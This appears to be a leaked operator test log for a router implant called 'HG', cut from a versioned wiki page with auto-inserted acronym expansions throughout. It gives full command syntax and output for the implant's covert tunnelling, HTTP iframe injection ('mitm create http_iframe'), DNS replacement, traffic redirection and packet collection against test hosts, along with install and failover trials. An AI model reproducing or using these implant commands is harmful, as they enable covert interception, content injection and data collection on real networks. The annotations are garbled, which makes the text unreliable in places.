+Repeated but this time closed the tunnel from CTCounter Terrorism session before it could time out.  User #? and drillbit appear to close gracefully however wireshark of ICON box shows TCPTransport Control Protocol FIN/ACK retransmissions continue from XXX.XXX.X.XX (TOPWAY-NET[CN]) for about 10 packets, then finally a RST/ACK is sent.
+Testing something happening to flux during the tunnel.
+Established tunnel
+Shut eth0 on flux 2
+CT session now unresponsive.  User #? stayed active for a bit then disconnected:
+
+Setting the tap0 interface status to upTunnel is now activeFailed to receive data from the tunnel!
+Closing User #?Closed the TAPVirtual Network kernel device interface tap0
+
+When re-establishing CTCounter Terrorism interface, had to update trigger number to match.  Given the sensitivity to triggers being sent with incorrect seq number, may be best to recommend using tun init to establish tunnel so that the trigger sequence number does not get changed in an .ini file.  Sending tunnel trigger with wrong seq also causes the snmp encoding errors to increment on DUT.
+
+
+Test specifying trigger seq number on command line with triggered tunnel initation:root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/linux# ./User #? ../config/User #?-endpoint.ini -t ../config/User #?-callback.ini -q 0x10
+
+
+Test behavior of tunnel when pps threshold reached
+
+Established Tunnel
+Raised the pps by generating traffic from the impersonated CTCounter Terrorism host as well as the impersonated tunnel host
+lowered threshold settings to 500/1000.
+Tunnel did drop when the threshold was reached. No CPU spike out of the teens.Tunnel is now activeFailed to receive data from the tunnel!
+Closing User #?Closed the TAPVirtual Network kernel device interface tap0root@debian:/home/user1/ops/cytolysis/cytolysis-1h/hg/tools/User #?/linux#
+
+
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> packet get_assist_threshold_status [Success]  Maximum Packets Per Second: 500  Number of Packets Counted Per Sample: 1000  Highest Observed Packets Per Second: 258 Number of Overflows Since Settings Last Changed: 0  Time of Last Overflow: -- ************ Success ************[packet get_assist_threshold_status]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> packet get_assist_threshold_status [Success]  Maximum Packets Per Second: 500  Number of Packets Counted Per Sample: 1000  Highest Observed Packets Per Second: 679 Number of Overflows Since Settings Last Changed: 1  Time of Last Overflow: 2016-02-01T20:20:46Z ************ Success ************[packet get_assist_threshold_status]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Test Tunnel using tap ip of vlan 3
+Reloaded device
+install HG
+Establish CT
+start User #? module
+create tunnel - tap ip on vlan 3 - XXX.XXX.X.XX (TOPWAY-NET[CN]) and impersonated XXX.XXX.XX.XXX (TOPWAY-NET[CN]).  Added flux route for XXX.XXX.XX.XX (TOPWAY-NET[CN])/29 and tunnel came up.
+Successfully nmap'd vlan 19 hosts.  no prints observed
+
+
+tested impersonated host becomes active on the network - tunnel drops as soon as impersonated host becomes active.  if impersonated host was already active on the network, they co-exist.
+tested when tap ip becomes active on network during a tunnel session, this does drop tunnel. but if tap ip was already active on network, that host cannot we browse.  Did not see any punch throughs of tunnel traffic to tap ip host.  however, that host is effectively broken.  This behavior was observed for windows host only, on linux i did not see the tunnel drop when changing ip to match impersonated host and then ifdown, ifup.
+
+
+
+
+SUP failover testing
+With hg installed, forced a failover via CLI.  Rebooted on other SUP.  as expected, CEF assist that was laid down for impersonated host on customer 1 - XXX.XXX.X.XX (TOPWAY-NET[CN]) was still present:
+cytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 receivecytolysis-1#
+That client cannot browse internet.  cleared cef on sup720. doesn't fix it. clear ip route did fix it.
+SUccessfully re-installed HG on sup in slot 6.
+reloaded device to start with a clean device.  will attempt to install, failover, then reinstall without clearing route, impersonating same host
+installed hg, established CTCounter Terrorism session impersonating XXX.XXX.X.XX (TOPWAY-NET[CN])
+
+forced failover through cli - veriufied that host cannot get out, RAArd still in place.
+installed hg and that did fix the host, 1.82 can now get out.  RAA still in place. Established CTCounter Terrorism session successfully.
+Failed BACK over.  RAA still in place.  Reinstall HG.  Establish CTCounter Terrorism session.  SUCCESS.
+Disconnected CTCounter Terrorism session and now RAA is dropped:cytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 receivecytolysis-1#show ip cef XXX.XXX.X.XX (TOPWAY-NET[CN])XXX.XXX.X.XX (TOPWAY-NET[CN])/32 attached to Vlan3
+
+Reloaded to start with a clean device.  Testing HG install - failover, then fail right back and reinstall. SUCCESS.
+Reloaded device - testing sup failover when primary is physically pulled.
+Installed HG.  verified install by est CTCounter Terrorism session, then closed it.
+Pulled primary sup - failed over without any problems.  Re-installed sup in slot 5.  Failed back over to slot 5 as active.
+Reinstalled HG - SUCCESS
+Reloaded - Testing installing HG, pulling SUP and then installing on new
+Reloaded DUT
+Installed HG.
+Forced failover through CI
+reinstalled hg - established CTCounter Terrorism session.  SUCCESS
+Reloaded - sup in slot 5 does not boot, goes to rommonAutoboot executing command: "boot bootflash:s72033-ipservices_wan-mz.122-33.SXI.bin"Loading image, please wait ...
+device does not contain a valid magic numberloadprog: error - on file openboot: cannot load "bootflash:s72033-ipservices_wan-mz.122-33.SXI.bin"Exit at the end of BOOT stringrommon 1 > bootdevice does not contain a valid magic numberboot: cannot open "bootdisk:"boot: cannot determine first file name on device "bootdisk:"rommon 2 > boot system bootflash:s72033-ipservices_wan-mz.122-33.SXI.binLoading image, please wait ...
+Invalid device specifiedBooting from default devicedevice does not contain a valid magic numberboot: cannot open "bootdisk:"an alternate boot helper program is not specified(monitor variable "BOOTLDR" is not set)and unable to determine first file in bootflashloadprog: error - on file openboot: cannot load "system bootflash:s72033-ipservices_wan-mz.122-33.SXI.bin"rommon 3 >
+
+sup in slot 6 does load.
+reseated sup in slot 5 and it booted successfully as standy by.  Tried reload again. - SUCCESS.  sup in slot 5 now active
+Reloading again to start with a clean device and attempt to repro the rommon condition
+Install HG, force failover through cli
+Reinstall HG on sup in slot6 - done.  
+Reload to fail back to slot 5- successful.  Could not reproduce the error above.  Might not have been due to HG.
+
+
+SMITE testing
+With new Windex in place and new Windows 7 target client, tested SMITE with active smite rule 60 times with no print:
+
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm rule show 2[Pending] Job: 136610984************ Pending ************[mitm rule show 2]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Success]  ID: 2  Type: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Enabled: Yes  Persistent: No  Source IP: 10.11.0.15  Source Mask: 255.255.255.255  Start SRCSource Port: 0  End SRCSource Port: 0  Dest IP: X.X.X.XX (LVLT-GOGL-8-8-8[US])  Dest Mask: 255.255.255.255  Start DSTDirectorate of Science & Technology port: 80  End DSTDirectorate of Science & Technology port: 80  Time Delay: 0d 0h 0m 0s  Time Duration: 0d 0h 0m 0s  Restart Delay: 0d 0h 0m 0s Max Sessions Termination: 0  Forced Time Duration: No  Automatic Restart: No  Max Restarts: 0  State: Active  Time Remaining: 0d 0h 0m 0s Press <enter> to continue Sessions Remaining: 0  Active Sessions: 0  Rule-Based HW Filtering: No  Max Affects per Host: 0  Bypass: No  Bypass Compression: Yes  Bypass Chunking: Yes  Cache Control: No  Host Filter:  URIUniform Resource Identifier Filter:  Source URL: https://X.X.X.XX (LVLT-GOGL-8-8-8[US])/test/?wdx=&promo_code=1z45rdjJob: 136610984************ Success ************
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]>
+
+Observed only 443, 80 and 53 in show ip nat trans output for this client.  No connections on port 7777 or 8888 with the new windex.
+Verified that whlie this rule is active other hosts are not affected.  Also verified that when this host browses to other web servers that do not match this rule, the iframe is not injected.
+Disabled the rule and verified that now i do not get the iframe in Victim 5.
+Observed an anomaly in output of show commands related to SMITE.  mitm status shows the following:[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm status[Success]  Enabled Rules: 1  Persisted Rules: 0  Active Sessions: 275 Sessions Affected: 6 ************ Success ************[mitm status]
+
+
+[mitm rule show 2]
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> [Success]  ID: 2  Type: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Enabled: Yes  Persistent: No  Source IP: 10.11.0.15  Source Mask: 255.255.255.255  Start SRCSource Port: 0  End SRCSource Port: 0  Dest IP: X.X.X.XX (LVLT-GOGL-8-8-8[US])  Dest Mask: 255.255.255.255  Start DSTDirectorate of Science & Technology port: 80  End DSTDirectorate of Science & Technology port: 80  Time Delay: 0d 0h 0m 0s  Time Duration: 0d 0h 0m 0s  Restart Delay: 0d 0h 0m 0s Max Sessions Termination: 0  Forced Time Duration: No  Automatic Restart: No  Max Restarts: 0  State: Active  Time Remaining: 0d 0h 0m 0s Press <enter> to continue Sessions Remaining: 0  Active Sessions: 0  Rule-Based HW Filtering: No  Max Affects per Host: 0  Bypass: No  Bypass Compression: Yes  Bypass Chunking: Yes  Cache Control: No  Host Filter:  URIUniform Resource Identifier Filter:  Source URL: https://X.X.X.XX (LVLT-GOGL-8-8-8[US])/test/?wdx=&promo_code=1z45rdjJob: 136610984mitm show :
+[XXX.XXX.X.XX (TOPWAY-NET[CN])]> mitm show[Success]  Actions Available:  Action: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Version: 3   Number of Rules: 1  Rules:  ID: 2  Type: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  Enabled: Yes  Persistent: No Persistent State: --  Source IP: 10.11.0.15/32  Dest IP: X.X.X.XX (LVLT-GOGL-8-8-8[US])/32  Action Data: https://X.X.X.XX (LVLT-GOGL-8-8-8[US])/test/?wdx=&promo_code=1z45rdj  ************ Success ************
+
+Found that the browser was caching even though i had it set to delete history on exit and never cache, and check for new versions of webpage every time i visit the page.  I even uninstalled hg and reloaded router and the iframe was still cached.  Reloaded host, still cached.  Finally fixed by forced refresh (ctl+f5).  need to look into if this is the source of the discrepancies in mitm output as well as consider if this will affect hosts operationally.
+Testing SMITE ccreate/disable/delete rules with -sm -ac -t -bk -bc -en -cc flags
+IXIA runing -10k nat sessions active
+IAC attack - spike to 48%
+Upload HG
+Create smite rule
+mitm create http_iframe 10.11.0.15 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 "https://X.X.X.XX (LVLT-GOGL-8-8-8[US])/test/?wdx=&promo_code=1z45rdj" -ac 5 -sm 10 -t 10m -bk -bc -cc -en
+created an identicla rule for 10.11.0.13
+Confirmed that rule 1 did not continue to inject iframe after 5 attempts from the one host.  Confirmed that therule was disabled when timer expired.
+mitm status shows 35 active sessions, but only 5 sessions were affected.  Creating JIRAUser Managment Software (Atlassian) ticket for this issue - HG-13 created for this.
+Successfully created, disabled and created, deleted rules matching a single host to single dest, single host to multiple dest, mult host to mult dest.
+Testing that rule will disable after max sessions reached - confirmed - after max sessions was hit, no further exploitation.  Rule disabled.
+Collected wireshark of iframe session on victim 5
+Tested that 443 traffic is not injected when rule is set up for 80 to same destination
+Testing impact to packet assist threshold.
+Characterized issue with tunnel dropping for XPWindows operating system (Version) NIC bounce
+
+
+
+
+Performance Testing
+Latency - Test how high latency HG can tolerate for both install and CT
+CT session - latency up to 4500 ms worked without errors.  At 5000ms, the triigger ack was lost, however session still established.  At 5500 ms, the CTCounter Terrorism session does not establish, Handshake fails, Listener resets.
+IAC attack - handles latency up to 4500ms - at 5000ms, it fails
+HG upload - handles up to 4500ms - at 5000ms, it fails
+Performing an IXIA test with HG installed, no capabilties running. 2 hour performance test.  Kicked off with HG test at 5:30PM.  Collected report and solarwinds data from this period.
+Reloaded device.  Re-ran same exact test.  Kicked off at 10:30AM on 2/9.
+Kicked off 2 hour IXIA test at 4pm - with HG, with smite rule active, with Seed traffic to match SMITE rule:[mitm create http_iframe 10.11.0.10 255.255.255.0 0 0 8.8.0.0 255.255.0.0 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]) -bc -bk -cc -en]
+
+
+Successfully injected over night - 13206 iframes.  Collected data from the two hours of IXIA traffic.
+[XXX.XXX.XX.XXX (TOPWAY-NET[CN])]> mitm status[Success]  Enabled Rules: 1  Persisted Rules: 0  Active Sessions: 13206 Sessions Affected: 13206 ************ Success ************[mitm status]
+[XXX.XXX.XX.XXX (TOPWAY-NET[CN])]>
+
+The SMITE results do not show the increase in CPU that was observed when IXIA traffic was added that is observed in the non-HG and with-HG sessions.  This is likely because when I ran this test, I had already previously run some IXIA traffic since the last reload, so arp tables, etc, might have already been buillt.  When CPU is evaluated after IXIA already up and running, HG adds 1% to the CPU.  SMITE every 5 seconds adds 2% over baseline of no HG.  Covert Tunnel running nmap adds 2% to baseline of no HG.
+Reloaded DUT, installed HG and setup SMITE rule.  Started IXIA traffic at 11:20.  Named this SMITE round 2.
+Observed spike in response time during IXIA test with HG to 240ms.  Did not observe on repeat of test with HG.  Could have been related to IXIA traffic gearing up, but not due to HG.  Confirmed that these spikes do happen without HG, to 280ms occasionally in solarwinds monitoring.
+Cytolysis High uses 210M of traffic, 40k flows and generates about 10k NATNetwork Address Translation translations.
+Deleted SMITE rule. Established Covert Tunnel and set an nmap of target subnet running. Started IXIA at 2:20P.
+
+
+Smoke test DIVRT
+configured the following rule for divrt:[XXX.XXX.XX.XXX (TOPWAY-NET[CN])]> mitm create dns_replace_ip 10.11.0.13 255.255.255.255 4.4.4.4 255.255.255.255 "www.red.com:100.100.40.3" -en
+
+
+successfully was redirected from the client to the new web server.  No prints observed on console.  no traps sent.
+[XXX.XXX.XX.XXX (TOPWAY-NET[CN])]> [Success]  Rule Summary: DNSDomain Name System Replace IP  ID: 2 Sessions Affected: 3  Rule - 2:  Host IP: 10.11.0.13  Sessions Affected: 3 Validation Sessions: 0  Last Session Time: 2016-02-10T22:39:27Z Last Session Domain: www.red.comJob: 136270424************ Success ************
+[XXX.XXX.XX.XXX (TOPWAY-NET[CN])]>
+
+disabled the rule and verified that the host does not get the new dns info any longer.
+re-enbaled the rule.  verified that other hosts are not affected by this rule
+deleted the rule.
+
+
+Smoke test of redirection
+configured the following redirect rule:redir create 10.11.0.13 255.255.255.255 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 tcp 0 0 100.100.40.4 80 0 
+attempted to browse and was not redirected. 
+Enabled the rule.
+was redirected.
+verified that other hosts are not affected by this rule
+deleted the rule
+no prints or traps ovbserved.
+
+
+Smoke test of packet collection
+created the following packet collection rulecollect create 10.11.0.13 255.255.255.255 0 0 100.100.40.0 255.255.255.0 80 80 tcp -en -bm 15
+
+verified that packets from other hosts were not collected
+generated traffic matching this rule and it was collected:Version 6  Default Mechanism cc  Default Block Size 25.00kB Circular Buffer Wrap No  Max Collection Size 750.00kB  Data Compression Yes  ID 6  Priority Low (0x1)  Enabled Yes  Persistent No Persistent State  Source IP 10.11.0.13/32  Destination IP 100.100.40.0/24 Job: 136289640
+
+Ran exfilparse.sh on the machine log and was able to view the data in wireshark.
+
+
+Uninstalled HG and reloaded to perform CONOPConcealed Operation rehearsal
+Verified flux nodes, routing and IXIA traffic, and seeds traffic in place.  Verified SNMPSimple Network Management Protocol monitoring in place.
+Collected show proc cpu hist and show mem at 9 AM after letting IXIA run all night without HG.
+At 9:07, IACInternational Access Code attacked and uploaded.  Finished at 9:18.
+Letting it run for a couple hours now with just HG, IXIA continuning.   Collected stats from no HG and IXIA 5-7AM window.  Will collect stats with IXIA and HG from 9-11AM.
+at 12:52, established CTCounter Terrorism session.  At 1pm entered the following SMITE rule:mitm create http_iframe 10.11.0.0 255.255.255.0 0 0 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.255 80 80 http://X.X.X.XX (LVLT-GOGL-8-8-8[US]) -bc -bk -cc -en
+Made sure i had seed http traffic from 10.11.0.10 running to X.X.X.XX (LVLT-GOGL-8-8-8[US]) as well as both 100.100.40.X servers.
+Verified iframes being injected for X.X.X.XX (LVLT-GOGL-8-8-8[US]) only.
+Rule Summary: HTTPHypertext Transfer Protocol IFRAMEEmbedded Webpage  ID: 3 Sessions Affected: 1887   Rule - 3:  Host IP: 10.11.0.10  Sessions Affected: 1887  Last Session Time: 2016-02-11T20:39:43Z Last Response Affected: /  Last Host Affected: X.X.X.XX (LVLT-GOGL-8-8-8[US])
+SMITE done, collected solarwinds data.
+delete smite rule, started CovertTunnel module and establsihed tunnel.  Kicked off nmap of 10.11 network (excluding .1)
+
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+| 5 
+| 6 
+| 7 
+| 8 
+| 9 
+| 10 
+| 11 
+| 12 
+| 13 
+| 14 
+| 15 
+| 16 
+| 17 
+| 18 
+| 19 
+| 20 
+| 21 
+| 22 
+| 23 
+| 24 
+| 25 
+| 26 
+| 27 
+| 28 
+| 29 
+| 30 
+| 31 
+| 32 
+| 33 
+| 34 
+| 35 
+| 36 
+| 37 
+| 38 
+| 39 
+| 40 
+| 41 
+| 42 
+| 43 
+|
+                    
